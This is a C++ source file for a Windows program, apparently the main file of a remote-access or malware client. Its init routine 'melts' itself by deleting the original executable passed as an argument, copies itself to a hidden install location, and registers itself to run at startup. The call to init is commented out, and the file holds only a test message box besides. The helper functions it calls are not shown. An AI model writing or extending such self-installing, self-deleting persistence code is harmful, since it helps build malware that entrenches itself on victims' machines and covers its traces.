/*

					SETTINGS CAN BE EDITED IN "settings.cpp"

*/

#include "includes.h"




//TESTFUNC

void testMB(std::string s)		//TEST FUNCTION
{
	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC





bool init()		//startup of program
{
	//VARIABLE SETUP
	General::currentPath = General::getCurrentPath();
	General::installFolder = General::getInstallFolder();
	General::installPath = General::getInstallPath(General::installFolder);

	

	if (!(General::lpArguments == NULL || (General::lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
	{
		remove(General::lpArguments);
	}

	if (Settings::installSelf)
	{
		if (!General::locationSet())				//checks if it is at it's destined location (config in settings.h)
		{
			General::setLocation();
			General::installing = true;
		}
	}

	if (Settings::setStartupSelf)
	{
		if (!General::startupSet())				//checks if it's startup is set
		{
			General::setStartup(convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? convStringToWidestring(General::installPath).c_str() : convStringToWidestring(General::currentPath).c_str(), NULL);
		}
	}
	

	General::runInstalled();			//checks if this run of the program is designated to the install process, then checks whether it should start the installed client

	
	return General::installing;
}




int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//VARIABLE SETUP
	General::lpArguments = lpCmdLine;

	/*
	if (init())
		return 0;
	*/

	//test stuff (WORKS \o/)

	return 0;
}